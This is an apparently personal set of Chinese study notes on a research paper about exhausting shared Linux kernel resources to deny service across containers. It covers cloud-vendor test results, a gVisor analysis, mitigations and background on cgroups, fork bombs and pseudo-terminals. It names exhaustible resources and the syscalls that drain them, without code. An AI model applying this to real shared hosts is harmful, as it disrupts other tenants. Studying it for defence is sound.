我们的主要观察结果是，对于namespace隔离的资源，对应的数据结构有一个指针字段，指向它所属的namespace。因此，我们的工具首先遍历内核中每种数据结构类型的所有字段。如果该类型具有名称空间指针，则将其标记为隔离资源。其次，对于已识别的隔离资源，我们的工具使用它来过滤§4.1中识别的共享抽象资源。 请注意，由于不同namesapce之间的映射，一些namespace隔离的资源仍然容易受到抽象资源攻击。如§3.2.2所述，idr由pid_namespace-&gt;idr隔离。但是，在非根PID namespace中分配的每个idr都映射到根PID namespace中的一个新的idr，以便根namespace可以管理它。因此，根PID namespace被所有PID namespace中的所有容器全局共享。因此，它仍然容易受到idr耗尽攻击。 在我们的分析中，我们手动过滤掉这些资源。 Analysis Results我们在LLVM 12.0中使用大约2500行c++代码实现了我们的分析工具。Linux内核IR是基于最新的Linux稳定版本v5.10和defconfig生成的。特别是，通过应用基于配置的分析和基于访问的分析，以及来自系统调用的可达性分析和seccomp限制分析，我们的工具确定了1844个容器可达的共享抽象资源。 Resource Filtering 通过每个用户配额限制和namespace隔离分析，我们的工具可以找到342个受rlimit限制或具有指向namespace结构的指针的资源。这些资源要么对路径进行限制检查，要么对其进行namespace。 我们进一步进行手工分析。具体来说，对于已识别的抽象资源中的每个资源𝑅，我们将遍历所有检测到的𝑅或𝑅字段的修改。如果修改不是定量的，比如被赋值为布尔类型、枚举类型或字符串类型，则将此修改标记为非定量的。如果对𝑅和𝑅字段的所有修改都是非定量的，我们将𝑅标记为不可耗尽的。我们的手工分析确定了492种不可耗尽的抽象资源，经过人工分析，仍然有1010个抽象资源。 Dynamic Validation 为了进一步验证这1010个资源的动态耗尽，我们开发了一个资源消耗的动态验证方法。对于每个资源，我们首先从可控性分析中获得其消耗点和触发的系统调用。在此之后，我们对这些消耗站点进行测量，以监控实际的资源消耗。接下来，我们执行相应触发系统调用的测试用例，以重复触发消费并记录结果。我们利用来自Linux测试项目的1156个测试用例，并开发177个新的用例来覆盖更多的用例。我们还开发脚本来自动化上述步骤。 我们应用动态验证方法来测试所有1010个资源的消耗。 对于1010个检测到的资源，其中700个不在驱动程序文件夹中，而其他310个资源在驱动程序文件夹中，在700个非驱动资源中，有389个资源可以动态重复触发，真阳性率为55.6%。驱动程序文件夹中的资源需要特别处理，原因有两个。首先，驱动程序是特定于硬件的。如果没有相应的硬件，就无法动态触发驱动程序代码。我们的主要观察结果是，大多数硬件支持的驱动程序在/dev或/sys/class文件夹下公开特定的接口。基于这种观察，我们删除了硬件不支持的驱动程序中的92个资源。第二，LTP提供的测试用例可能不覆盖特定的驱动程序。 为了解决这个问题，我们修改LTP测试用例并为驱动程序开发新的测试用例。218个驱动资源中，有112个驱动资源可以重复触发，真阳性率为51.4%。 识别容器可耗尽抽象资源是一项非常具有挑战性的任务，因为它需要领域知识来触发抽象资源的耗尽，并且需要评估这些资源耗尽时的影响。在本文中，我们进行了初步分析。请注意，彻底的分析和风险评估需要来自Linux内核和容器社区的帮助。因此，我们计划开源我们的工具和检测到的抽象资源。我们认为这将有助于Linux内核和容器社区识别资源隔离的弱点，并开发健壮的资源遏制方案。 Abstract Resource Attacks On Cloud Platforms在本节中，我们将进一步评估针对公共云供应商容器环境的抽象资源攻击。我们首先介绍环境设置，然后给出结果。 Environment Setup and Ethical Considerations为了评估抽象资源攻击的有效性，我们在本地和云平台上建立了容器环境。 本地测试环境已在§3.1中给出。 Ethical Considerations 对于云平台，我们打算尽可能减少我们的攻击对其他云用户的影响。因此，我们使用专用的虚拟服务器，如AWS EC2、Azure VM、谷歌GCE、阿里巴巴ECS来进行实验。此外，我们确保我们是该服务器的唯一用户。 此外，大多数容器用户利用容器编排系统来部署和管理容器。因此，我们选择了最流行的Kubernetes，并利用云供应商的Kubernetes服务在虚拟服务器上部署两个docker容器(即攻击者容器和受害者容器)。为了实现强隔离，我们为attacker-container和victim-container应用了不同的Kubernetes namespace。如§4.2所述，容器也受到每个用户配额的限制。为了在我们的实验中强制执行每个用户的配额，我们在不同的用户中运行攻attacker-container和victim-container，并强制执行每个用户的配额。我们还在§6中讨论了PAM可以部署的限制。 Amazon AWS 对于容器服务，我们使用Elastic Kubernetes Service (EKS)在EC2实例上部署两个容器实例。EC2实例包含4个cpu、8gb内存和20gb SSD磁盘。在容器部署期间，我们惊奇地发现“Amazon EKS默认pod安全策略”使用了EKS。特权为默认pod安全策略。请注意，此策略允许容器作为特权用户运行，还允许特权升级以及主机网络访问。 为了更好地演示我们提出的攻击的有效性，我们从本地测试环境采用了更强的安全策略，从EKS容器运行在非根用户中，删除所有特权，启用所有namespace和cgroup，并使用docker seccomp配置文件来阻止50多个敏感系统调用，包括ptrace、pivot_root等。我们对attacker-container和victim-container应用相同的安全策略。 MS Azure我们使用Azure Kubernetes服务（AKS），在Azure虚拟机上部署了两个容器实例。Azure虚拟机包含2个CPU、8GB内存和120GB磁盘。为了提高部署的容器的安全性，Azure在AKS中提供了pod安全策略的最佳实践，通过在yaml文件中设置runAsUser:1000，以非root用户的身份运行容器，并通过设置allowPrivilegeEscalation: false，拒绝特权升级。然而，它仍然增加了两种能力，即CAP_NET_ADMIN和CAP_SYS_TIME，并且没有强制执行seccomp。与AWS的设置一样，我们对AKS上的容器采取了更严格的安全策略。除了最佳实践建议（即非root用户和不允许特权升级），我们以非root用户运行AKS容器，放弃所有功能，启用所有的namespace和cgroup，并使用docker seccomp配置文件。来阻止50多个敏感的系统调用。我们对attacker-container和victim-container应用相同的安全策略。 Google Cloud 对于容器服务，我们选择Kubernetes并使用谷歌Kubernetes Engine (GKE)在谷歌计算引擎实例上部署两个容器实例。我们使用的谷歌计算引擎(GCE)实例包含4个cpu、16gb内存和100gb SSD。更具体地说，我们应用一个GCE实例，并基于该GCE实例上的常规运行时部署两个容器(即attacker-container和victim-container)。 对于容器部署，我们遵循GKS容器设置向导。谷歌Cloud提供了操作容器的最佳实践，建议避免使用特权容器。因此，在yaml配置文件的securityContext中，我们不允许特权升级，以非特权用户运行容器，并删除所有功能。GKS设置向导默认启用6个namespace和13个cgroup。此外，我们应用docker默认的seccomp配置文件来过滤敏感的系统调用。 此外，GKE还提供了谷歌的安全容器运行时- gvisor，它利用名为Sentry的用户空间内核为来自应用程序的系统调用提供服务。哨兵调用大约50个主机系统调用，根据需要提供服务。gVisor被认为是容器的安全沙盒运行时。对于基于gVisor的容器部署，其所有安全设置(包括非特权用户、删除功能)都与GKE docker运行时设置相同。 Alibaba Cloud 在容器服务方面，阿里云提供了弹性容器实例、Kubernetes容器服务、容器注册和阿里云服务Mesh。我们使用Kubernetes的容器服务在一个弹性计算服务(ECS)实例上部署两个容器实例。ECS实例包含4个cpu、16gb内存和120gb SSD盘。对于容器安全性，我们遵循容器服务部署的官方指南，该指南通过将runAsUser设置为1000来使用非根用户运行容器。但是，它并不禁止特权升级，也不强制执行seccomp和SELinux。 我们采取了与以往相同的更强有力的安全政策。我们在非根用户中运行容器，删除所有功能，启用所有namespace和cgroup，并使用docker seccomp配置文件来阻止敏感的系统调用。我们对attacker-container和victim-container应用相同的安全策略。 Selection of Abstract Resources为了进行攻击，我们需要选择有意义的抽象资源。为了演示抽象资源攻击的有效性，我们希望选择影响操作系统服务各个方面的抽象资源，包括进程管理、内存管理、存储管理和IO管理。 因此，我们首先根据它们的声明位置将所有标识的资源分为这四类，即用于进程、内存、存储和IO管理的资源。然后，我们根据我们的领域知识从每个类别中选择至少一个资源，即我们知道资源耗尽的影响。 最终，我们选择了涵盖所有四个方面的7个抽象资源，。资源名称列在表的第二列中。在所选的抽象资源中，基于访问分析识别出PID idr、dirty ratio、inode、netns_ct-&gt;count、random entropy个，基于配置分析识别出nr_files、pty_count 2个，如表第三列所示。我们还在表的第四列中列出了资源消耗函数，在表的最后一列中列出了用于触发攻击的系统调用。 Attacking Results on Cloud Platforms如前一节所述，我们为我们提出的攻击设置了5个测试环境，包括本地、AWS、Azure、谷歌云和阿里云。对于每个测试环境，我们设置了两个具有严格安全策略的容器，作为attacker-container和victim-container。attacker-container针对某些抽象资源发起攻击。我们使用上述7个选定的抽象资源来发起攻击。在victim-container和主机上都运行一个基准测试，以测量它们在抽象资源攻击下的性能下降。结果如表所示。 PID idr攻击。PID idr攻击及其根源已在§3.2.1中详细介绍。针对厂商的PID攻击，所有受害容器，甚至在Local、AWS、Azure和谷歌测试环境中的主机都不能fork新的进程。victim-container甚至会被驱逐。阿里云不容易受到PID攻击。 dirty ratio攻击。dirty ratio攻击已经在§3.3.1中讨论过。如果没有攻击，则认为IO性能为100%。在dirty ratio攻击下，受害容器在AWS、Azure和阿里云上的IO性能分别下降到6.3%、1.2%和6.7%。更糟糕的是，主机也容易受到这种攻击，其IO性能在AWS上下降到8.3%，在阿里云上下降到8.6%。这里MS Azure不提供对主机的任何访问，因此我们无法获得Azure主机IO性能。谷歌云不容易受到dirty ratio攻击。 inode攻击。在inode攻击中，受害者容器不断分配inode结构。不幸的是，mount namespace没有隔离inode。Linux内核都不提供任何与inode相关的cgroup。结果，该分区上的所有inode都被耗尽。所有消耗inode的操作都会失败，包括来自victim-container或主机的操作。在我们的实验中，阿里云很容易受到inode攻击。victim-container甚至会被驱逐。此外，主机也不能创建任何新文件。 nr_files攻击。nr_files攻击已经在§3.4.1中讨论过。nr_files由所有容器全局共享。没有namespace或cgroup来限制它的使用。当nr_files配额耗尽时，各种操作都会失败，包括打开文件、执行新程序、创建管道、创建套接字和创建计时器，因为Linux中的所有东西都是文件。我们的实验表明，所有排名前4的供应商都容易受到nr_files攻击。 pty_count攻击。pty_count攻击已经在§3.5.1中讨论过，它会耗尽所有开放的伪终端配额。这将导致所有需要打开新的伪终端的操作失败，如SSH连接等。不幸的是，所有前4个供应商都容易受到pty_count攻击。 netns_ct-&gt;count攻击。Linux内核中的Netfilter提供了连接跟踪功能，可以跟踪所有的逻辑网络连接。而总连接数是有限制的，由struct netns_ct-&gt;count来计数。主机和容器都需要维护连接。尽管容器位于不同的net namespace中，但它们的所有连接都需要使用init_net.ct。主机的init net namespace的计数。因此，如果在短时间内产生大量的TCP连接，就会消耗掉init_net.ct的所有配额。计数，导致Netfilter故障。在我们的实验中，attacker-container可以耗尽init_net.ct。数秒内计数，导致随机丢包。同样，前4个供应商的所有环境都容易受到结构体netns_ct-&gt;count攻击。 random entropy攻击。在Linux内核中，每次读取/dev/random都会消耗random entropy。每当random entropy下降到阈值以下时，Linux内核就会阻塞对/dev/random的读取操作，并等待entropy增加。 由于没有namespace或cgroup来隔离random entropy，attacker-container很容易通过反复读取/dev/random来消耗所有的random entropy，从而导致良性的读取阻塞。最新的Linux内核v5.10通过将/dev/random读重定向到/dev/urandom修复了这个问题。然而，Azure和阿里云都容易受到这种攻击。 Attacking gVisor我们还对gVisor进行了7种资源攻击。为了建立gVisor环境，我们在谷歌Kubernetes Engine (GKE)中选择runsc而不是runc作为容器运行时，如§5.1所述。其中nr_files攻击和netns_ct-&gt;count攻击两种攻击在gVisor环境下仍然有效。在接下来的文章中，我们将分析为什么这两种攻击可以在gVisor上工作。 对于nr_files, gVisor使用Sentry为系统调用服务，而Gofer为Sentry处理不同类型的IO。Sentry拦截来自容器的open syscall并将请求发送给Gofer。在另一边，Gofer通过调用主机操作系统的openat系统调用来处理该请求。最终，主机操作系统上的openat系统调用触发了alloc_empty_file函数，它消耗了nr_files。通过这种方式，gVisor的攻击者能够耗尽主机的nr_files。对于netns_ct-&gt;count，Sentry拦截连接系统调用，并使用自己的网络堆栈将数据包转发到主机中创建的veth-peer网卡。vth -peer连接到主机中的虚拟网桥。当网络帧通过虚拟网桥转发时，主机上的netfilter被触发调用nf_conntrack_alloc函数，该函数消耗netns_ct-&gt;count。因此，gVisor中的攻击者仍然可以耗尽主机的netns_ct-&gt;count。 Summary对于自部署的共享内核容器环境，其中两个易受6次攻击，一个易受5攻击，另一个易受4攻击。令人惊讶的是，gVisor运行时也容易受到两种攻击——nr_files攻击和netns_ct-&gt;count攻击。我们已经向所有四个供应商报告了这些攻击。他们都确认了问题存在于他们的共享内核容器环境中。 尽管顶级供应商使用虚拟机来隔离不同租户的容器，但由于几个原因，抽象资源攻击仍然是可行的。首先，正如在Linux、FreeBSD和Fuchsia上所演示的，抽象资源攻击是操作系统级虚拟化所固有的，因此是一种广泛的攻击类型。其次，没有经验的用户可能不了解共享内核的风险，可能会使用容器进行sand-boxing。我们的论文将有助于提高对风险的认识。第三，即使在同一个租户中，竞争的团队也可能通过利用抽象资源来攻击对方。因此，监控和减轻此类攻击仍然是必要的。 Mitigation Discussions在本文中，我们揭示了除了物理资源，容器还共享底层运行内核的抽象资源。这些抽象资源很容易被攻击，后果很严重。在下面，我们给出了多种策略来降低抽象资源带来的风险。 Using PAM for per-user quota restrictions 正如正如第4.2节中提到的，Linux内核提供了允许用户加载用户定制的PAM的接口。PAM能够限制18种资源，其中5种为抽象资源，包括maxlogin/maxsyslogins、nofile、nproc和sigpending。从我们与云计算供应商的沟通中，我们不知道有任何云计算供应商采用PAM。因此，我们建议对某些抽象资源的限制使用PAM。§4.2节提到的，Linux内核提供了允许用户加载用户定制的PAM的接口。PAM能够限制18种资源，其中5种为抽象资源，包括maxlogin/maxsyslogins、nofile、nproc和sigpending。从我们与云计算供应商的沟通中，我们不知道有任何云计算供应商采用PAM。因此，我们建议对某些抽象资源的限制使用PAM。 Using VM for strong isolation 对于安全关键型应用程序，我们建议不要使用多租户容器环境。更强的隔离方案，例如基于虚拟机的虚拟化，是更可取的。 Using Monitoring Tools 我们建议使用Kubernetes集群的监控工具，如Falco，来监控容器的资源消耗。对于敏感的抽象资源(如nr_files和inode)，用户应该自定义自己的规则来监视系统中特定的资源消耗。 Improving current isolation design 对于现有的namespace，如PID namespace，由于映射到根namespace的设计，无法防御资源耗尽攻击。如§3.2.2所述，Linux内核在根PID namespace中为在其他PID namespace中分配的任何idr分配一个额外的idr。因此，根PID namespace仍然是全局共享的。攻击者仍然可以很容易地耗尽根PID namespace中的PID，从而导致DoS攻击。出于类似的原因，即使被NET namespace隔离，nf-conntrack 数 netns_ct-&gt;count也可能被攻击。因此，Linux社区需要重新审视namespace的设计，消除namespace依赖关系以提高隔离性。 New kernel containment mechanisms Linux内核社区和容器社区需要投入更多精力来保护抽象资源。实际上，我们已经向Docker安全团队报告了这个问题。反馈是“Linux容器只能使用可用的内核隔离机制。如果没有内核机制来控制限制，容器就不能做任何事情来限制它”。因此，我们首先需要对所有容器共享的抽象资源进行彻底的分析，以便我们能够理解，更重要的是，清除它们的数据依赖关系。这需要全面的内核领域知识和大量的内核代码更改。而且，Linux内核最初并不是为支持操作系统级虚拟化而设计的。它的资源隔离和遏制是不完整的。因此，需要新的namespace和cgroup。 More restrictive system call blocking 从容器方面来看，目前，即使执行了seccomp，容器中的应用程序仍然可以访问大约250个系统调用。在我们了解这些系统调用的数据依赖性之前，建议执行更严格的seccomp配置文件来阻止更多不必要的系统调用。容器用户可以使用技术来获得更严格的seccomp配置文件，以减少潜在的抽象资源攻击的可能性 Related WorkVirtualization Techniques在云环境中有两种主流的虚拟化技术，基于vm的虚拟化和OS-level虚拟化。与基于vm的虚拟化相比，OS-level虚拟化越来越流行，因为它可以通过轻量级虚拟化实现完整的应用程序功能。为了充分了解性能优势，研究人员进行了一系列研究。Felter等人表明，通过使用一组涵盖多个资源的基准测试，Docker在所有情况下都可以获得比KVM更好的性能。Joy等人在性能和可伸缩性方面对Linux容器和虚拟机进行了比较。Zhang等人的研究表明，容器在大数据环境中具有比虚拟机更好的性能。 所有这些工作都表明，操作系统级虚拟化比传统的基于虚拟机的虚拟化具有更好的性能。然而，他们都没有注意到底层内核抽象资源的潜在影响。本文揭示了抽象资源引入的新的攻击面。 Resource IsolationLinux使用功能来禁止没有特定功能的进程访问相应类型的资源实例。 研究人员提出了基于Linux功能的方法，如Wedge ， Capsicum和ACES。这些工作执行更细粒度的能力控制，以减轻内存损坏攻击。然而，他们不能防御我们的DoS攻击，耗尽可访问的共享资源。 内存地址空间隔离是一种典型的资源空间隔离方案，避免内存地址资源耗尽。Linux命名空间隔离了§2.1中列出的8种资源。这些方案只能隔离有限类型的资源。资源容器建议扩展单片内核，隔离系统资源，在线程级对资源进行划分，类似于控制组。由于性能开销很大，使用资源容器来保护所有抽象资源是不切实际的。EdgeOS为边缘云部署了强隔离的操作系统。然而，采用没有硬件支持的微内核会比单片内核引入更多的开销。Faasm使用软件故障隔离(SFI)进行内存隔离，而在无服务器计算中使用名称空间隔离网络资源空间。然而，大多数共享资源仍然暴露在DoS攻击的威胁之下。 Container Security除了资源隔离之外，还有对容器安全性的研究。Gao等人发现，可以利用&#x2F;proc或&#x2F;sys的信息泄露，发动电源攻击。而同一研究小组还进行了5次攻击，产生带外工作负载，以打破Linux控制组的资源约束。但它们主要针对信息泄露问题或攻击CPU、IO等物理资源，而不是抽象资源。 Lin等人表明容器不能隔离内核漏洞。另一项工作使用静态分析来分析Docker的代码，以找到漏洞和修补代码之间的差异。然而，这些工作主要针对现有的漏洞和利用。相反，我们的工作引入了针对共享抽象资源的新攻击。 此外，还有加固集装箱的工作。Lei等人提出了一种名为SPEAKER的容器安全机制，以减少应用程序在容器中可用的系统调用。Sun等人开发了为每个容器提供安全策略隔离的安全namespace。另一项工作使用Intel SGX保护容器，它提供了一个低性能开销的小型可信计算基础。Brady等人实现了容器图像的安全评估系统。然而，所有这些作品中的容器仍然依赖于内核提供各种服务，因此仍然容易受到抽象资源攻击。 Conclusion在本文中，我们揭示了共享内核在操作系统级虚拟化中引入的一种新的攻击面。这些容器直接或间接地共享成千上万的抽象资源，这些资源很容易被耗尽，从而导致对其他容器的DoS攻击。 为了显示限制抽象资源的重要性，我们进行了抽象资源攻击，针对操作系统内核的不同方面的抽象资源。结果表明，攻击抽象资源具有很强的实用性和关键性。 抽象资源本身就难以包含。为了了解这些攻击面，我们首先进行了一次系统分析，以识别Linux内核中易受攻击的抽象资源。我们的工具成功检测了501个动态触发的抽象资源，从中选取了7个，并在排名前4的云供应商的自部署共享内核容器环境中进行了攻击实验。结果表明，所有环境都容易受到我们的攻击。为了降低风险，我们为容器用户和开发人员提供了一些建议。 My硬件虚拟化和OS-level虚拟化虚拟化技术通常可以分为两大类：操作系统级虚拟化（OS-level virtualization）和硬件虚拟化（hardware virtualization）。这两者的主要区别在于虚拟化层的位置以及资源分配方式。 操作系统级虚拟化（OS-level virtualization)操作系统级虚拟化是一种轻量级虚拟化技术，它允许在单个操作系统内运行多个独立的、隔离的应用程序或服务。在这种方式下，所有虚拟实例共享相同的操作系统内核，但每个实例拥有自己的文件系统、进程、网络等资源。 详细说明： 资源分配：操作系统级虚拟化使用容器（Container）技术将系统资源（如CPU、内存、磁盘、网络等）划分给各个虚拟实例。容器之间相互隔离，互不干扰。 性能：操作系统级虚拟化具有较低的性能开销，因为所有虚拟实例共享相同的操作系统内核，避免了多个操作系统之间的资源竞争。 灵活性：操作系统级虚拟化支持的操作系统类型受限于宿主机操作系统，因此在跨平台方面的灵活性较差。 实现方式： Linux：LXC（Linux Containers）、Docker FreeBSD：Jails Solaris：Zones&#x2F;Containers 硬件虚拟化（Hardware virtualization）硬件虚拟化是一种全面的虚拟化技术，它允许在单个物理机器上运行多个独立的、完全隔离的操作系统实例。在这种方式下，虚拟化层位于操作系统和硬件之间，为每个虚拟机提供一个虚拟硬件环境。 详细说明： 资源分配：硬件虚拟化使用虚拟机（Virtual Machine）技术将系统资源（如CPU、内存、磁盘、网络等）划分给各个虚拟实例。虚拟机之间相互隔离，互不干扰。 性能：硬件虚拟化具有较高的性能开销，因为每个虚拟机需要运行独立的操作系统内核，导致资源竞争和虚拟化开销。 灵活性：硬件虚拟化支持运行不同类型的操作系统，具有较强的跨平台灵活性。 实现方式： 基于软件的虚拟化：VMware Workstation、VirtualBox 基于硬件的虚拟化：Intel VT-x、AMD-V 虚拟化管理器（Hypervisor）：VMware ESXi、KVM（Kernel-based Virtual Machine）、Microsoft Hyper-V、Xen 总结起来，操作系统级虚拟化和硬件虚拟化的主要区别在于虚拟化层的位置以及资源分配方式。操作系统级虚拟化通过共享相同的操作系统内核实现较低的性能开销，但跨平台灵活性较差；硬件虚拟化允许运行多个独立的操作系统实例，具有较强的跨平台灵活性，但性能开销较高。 LLVMLLVM（Low Level Virtual Machine）是一个编译器基础设施项目，它提供了一系列模块化和可重用的编译器组件和工具链。LLVM的设计目标是为各种编程语言提供一个通用的中间表示（Intermediate Representation，IR），以及一套用于优化、分析和生成机器代码的编译器后端。LLVM项目包括一些子项目，如Clang（C、C++和Objective-C的编译器前端）和LLDB（一个调试器）。 LLVM的核心组件包括： LLVM IR：LLVM中间表示是一种低级别、类型化、平台无关的编程语言，用于表示程序的结构和行为。LLVM IR既可以表示为人类可读的文本，也可以表示为二进制格式。 编译器前端：编译器前端将源代码（如C、C++、Rust等）解析成LLVM IR。Clang是LLVM最著名的编译器前端，用于处理C、C++和Objective-C语言。其他语言也有针对LLVM的编译器前端。 优化器：LLVM提供了一系列通用的代码优化和转换通道，这些通道可以在LLVM IR上进行操作，例如：常量折叠、死代码消除、循环不变式代码移动等。优化器可以根据需要配置和组合，以生成高度优化的代码。 编译器后端：编译器后端将优化后的LLVM IR转换为特定架构的机器代码。LLVM支持多种目标平台，包括x86、ARM、MIPS、WebAssembly等。编译器后端还负责处理调用约定、寄存器分配和指令调度等底层细节。 LLVM的优势在于其模块化、可扩展和可重用的设计。这使得LLVM可以很容易地支持新的编程语言和硬件架构，而不需要重新实现整个编译器。这也使得LLVM成为了许多编程语言（如Rust、Swift和Julia）和平台（如WebAssembly、GPUs和FPGAs）的编译器基础设施的首选。 Linux cgroup的组织和结构cgroup 是一种用于限制和控制进程资源使用的实用工具： 限制资源：Linux cgroup 的主要目的是限制进程使用的资源，如 CPU 使用率、内存、磁盘 I&#x2F;O 等。这有助于确保系统上的各个进程不会过度消耗资源，从而影响其他进程或整个系统的性能。 控制组内进程：cgroup 负责管理和控制组内所有进程的资源使用。这意味着你可以将一组进程组织在一个 cgroup 中，并对整个组施加资源限制，而不是单独设置每个进程的限制。 树状结构：cgroup 的组织方式是树状结构，其中每个节点（cgroup）可以包含若干子节点（子 cgroup）。这种结构允许你对资源使用进行分层管理，通过在不同层次施加不同的限制，可以更灵活地控制进程资源使用。 子节点和父节点的资源关系：在 cgroup 树状结构中，子 cgroup 的资源限制包括其父 cgroup 的资源限制。这意味着子 cgroup 不能单独设置超出其父 cgroup 限制的资源使用。这有助于维护整体资源限制的一致性，并确保子 cgroup 不会因过度消耗资源而影响其父 cgroup 或整个系统。 递归强制执行：cgroup 树结构中的资源限制是递归强制执行的。这意味着一个 cgroup 的资源使用限制将受到其所有祖先（父、祖父等）cgroup 限制的约束。这可以确保在整个 cgroup 树结构中，资源限制得到恰当的执行和遵守。 总之，Linux cgroup 是一种用于限制和管理进程资源使用的实用工具。它采用树状结构来组织进程，允许分层管理资源，并通过递归强制执行来确保资源限制得到遵守。 fork炸弹和idrfork炸弹Fork 炸弹是一种拒绝服务攻击（DoS攻击），其目的是通过创建大量子进程耗尽系统资源，从而导致系统崩溃或无法响应。攻击者可以编写一个简单的程序，使其反复调用 fork() 系统调用，每次调用都会创建一个新的子进程。这些子进程可能会继续创建更多子进程，从而导致进程数量迅速增加。这种攻击方法也被称为“逻辑炸弹”或“蠕虫炸弹”。 在 Linux 系统中，fork() 系统调用用于创建一个新进程，它是当前进程的一个副本。新进程（子进程）继承了父进程的资源（如打开的文件描述符、内存映射等），并从父进程的当前执行点开始执行。子进程拥有自己的独立地址空间和资源，并分配一个唯一的进程 ID。 idr在 Linux 内核中，IDR（ID Radix Tree）是一种用于管理和查找整数类型对象标识符（如进程 ID、文件描述符等）的数据结构。IDR 是一种基于基数树（radix tree）的高效数据结构，可以快速查找、添加和删除 ID。IDR 用于分配唯一的 ID 给内核对象，如进程、线程、文件等，以便在内核中进行跟踪和管理。 fork 炸弹会通过创建大量子进程来耗尽所有可用的进程 ID，从而导致系统无法创建新的进程。这可能会导致系统性能下降、响应缓慢甚至崩溃。为了防止这类攻击，系统管理员可以通过设置进程数资源限制（如使用 ulimit 命令）或在容器中使用cgroup 限制进程数来保护系统。 clone系统调用clone() 系统调用是 Linux 中用于创建进程和线程的一个底层函数。与 fork() 相比，clone() 提供了更多的选项和灵活性，因为它允许程序员指定哪些资源应该在父进程和新创建的子进程之间共享。这使得 clone() 适用于创建轻量级的线程以及新的独立进程。 clone() 系统调用的原型如下： 1int clone(int (*fn)(void *), void *child_stack, int flags, void *arg, ...); 参数说明： fn：一个函数指针，指向子进程或线程开始执行的函数。子进程或线程运行结束后，这个函数应该返回一个整数值，用于表示退出状态。 child_stack：指向子进程或线程的栈空间的指针。子进程或线程在执行过程中将使用这个栈空间。 flags：用于指定子进程或线程的行为和资源共享的位掩码。这些标志包括 CLONE_VM（共享内存空间）、CLONE_FS（共享文件系统信息）、CLONE_FILES（共享文件描述符表）等。通过组合这些标志，程序员可以精细控制子进程或线程的行为。 arg：传递给 fn 函数的参数。通常，它是一个指向某种结构或数据的指针。 clone() 系统调用的返回值在父进程和子进程中有所不同。在父进程中，clone() 返回新创建的子进程或线程的进程 ID（PID）。在子进程中，clone() 返回 0。如果创建失败，clone() 返回 -1，并设置相应的错误码。 clone() 系统调用的使用相对复杂，通常不直接在应用程序中使用。在实践中，程序员更倾向于使用更高级别的库函数，如 pthread_create()（用于创建线程）或 fork()（用于创建进程）。这些库函数在内部使用 clone() 系统调用来完成进程和线程的创建。 脏内存脏内存（Dirty Memory）是计算机内存管理中的一个概念，指的是已经被修改过但尚未写回到持久存储（如硬盘）的内存数据。在操作系统和应用程序中，内存（RAM）被用作缓存，以加速对数据的访问。与磁盘相比，内存访问速度要快得多，因此将数据缓存在内存中可以提高系统性能。 当一个程序或操作系统修改了内存中的数据，与磁盘上的原始数据不再一致时，这部分内存就被称为 “脏内存”。脏内存中的数据最终需要写回到磁盘，以确保数据的一致性和持久性。以下是脏内存产生的一些常见场景： 文件系统缓存：操作系统通常会将磁盘上的文件数据缓存在内存中，以提高文件访问速度。当一个程序修改了文件内容时，内存中的缓存数据变为脏内存。这些脏内存数据最终需要同步回磁盘，以确保文件在磁盘上的内容与内存中的内容一致。 数据库缓存：数据库系统经常使用内存来缓存数据库表和索引中的数据。当数据库事务修改了表中的数据时，相应的内存缓存数据也会变为脏内存。这些脏内存数据需要在适当的时机写回到磁盘，以确保数据的一致性和持久性。 虚拟内存管理：在虚拟内存管理中，操作系统通过将内存中的数据与磁盘上的交换空间（或页面文件）进行交换，来模拟更大的内存空间。当操作系统需要将内存中的数据交换出去时，如果这部分数据是脏内存，操作系统需要先将其写回到磁盘，然后才能将其交换出去。 操作系统通常会使用一些策略来平衡脏内存的处理和系统性能。例如，Linux 内核通过监控脏内存占比（dirty ratio），在必要时触发后台线程将脏内存同步到磁盘。这样可以在提高系统性能的同时，确保数据的一致性和持久性。 Linux处理脏内存 Linux 内核如何处理脏内存（即已修改但尚未同步到磁盘的内存）的过程。在 Linux 内核中，dirty_throttle_control 结构体用于管理和控制脏内存。结构体中的 dirty 字段表示整个内核空间的脏内存占比（dirty ratio）。 当 dirty 值过高时，内核会唤醒后台线程（例如 pdflush、flusher 或 kswapd），将脏内存同步到磁盘。这有助于确保数据的一致性和持久性，防止意外丢失。 然而，如果 dirty 值太高，内核会阻塞 write_back 操作。这意味着内核将所有写操作都转换为 write_through 操作，从而降低写性能。接下来，我们解释 write_back 和 write_through 之间的区别： write_back：在 write_back 操作中，数据首先写入缓存（例如 CPU 缓存或文件系统缓存）。一旦数据被写入缓存，操作就被认为是完成的，即使数据尚未同步到磁盘。在后台，脏数据会在适当的时机被刷新到磁盘。write_back 的优势在于它可以提供较高的写性能，因为写操作可以立即返回，而不需要等待磁盘同步。 write_through：在 write_through 操作中，数据同时写入缓存和磁盘。写操作在数据被写入磁盘之前不会被认为已完成。虽然这可以确保数据的一致性和持久性，但 write_through 的性能通常低于 write_back，因为它需要等待磁盘同步。 总之，这段话描述了 Linux 内核如何在处理脏内存时在性能和数据一致性之间寻求平衡。当脏内存占比过高时，内核会采取措施降低写性能，以确保数据的一致性和持久性。 Linux伪终端Linux 内核使用 /dev/ptmx（主设备）和 /dev/pts（从设备）来实现伪终端（pseudo-terminal，简称 pty）。伪终端是一种特殊的终端设备，它不直接连接到物理设备，而是通过软件来模拟终端的输入和输出。伪终端广泛应用于远程登录（如 SSH）、终端模拟器（如 xterm）和其他需要模拟终端行为的场景。 以下是关于伪终端和 /dev/ptmx 以及 /dev/pts 的一些详细信息： 主设备（&#x2F;dev&#x2F;ptmx）：/dev/ptmx 是一个字符设备文件，用于创建伪终端的主设备。当一个进程（如 SSH 服务器或终端模拟器）需要创建一个新的伪终端时，它会打开 /dev/ptmx 设备文件。内核会为这个进程分配一个未使用的伪终端，并返回一个指向伪终端主设备的文件描述符。主设备用于管理伪终端，如接收从设备的输入数据、向从设备发送输出数据等。 从设备（&#x2F;dev&#x2F;pts）：/dev/pts 是一个虚拟文件系统（通常挂载在 /dev/pts 目录下），用于存储伪终端的从设备。当一个伪终端被创建时，内核会在 /dev/pts 目录下为其从设备分配一个唯一的编号（如 /dev/pts/0、/dev/pts/1 等）。从设备用于模拟终端的输入和输出操作，如读取用户输入、显示文本输出等。通常情况下，从设备会被分配给另一个进程（如 shell），以便它可以与主设备进行通信。 通过主设备和从设备的交互，伪终端实现了终端模拟器和其他类似程序与 shell、远程会话等之间的通信。这种抽象使得伪终端可以在不依赖于特定硬件的情况下，提供与物理终端类似的功能。 FreeBSD和FuchsiaFreeBSD和Fuchsia是两种不同的操作系统。下面我们分别详细解释这两个操作系统。 FreeBSDFreeBSD是一个类Unix的开源操作系统，它基于创建Unix的Berkeley Software 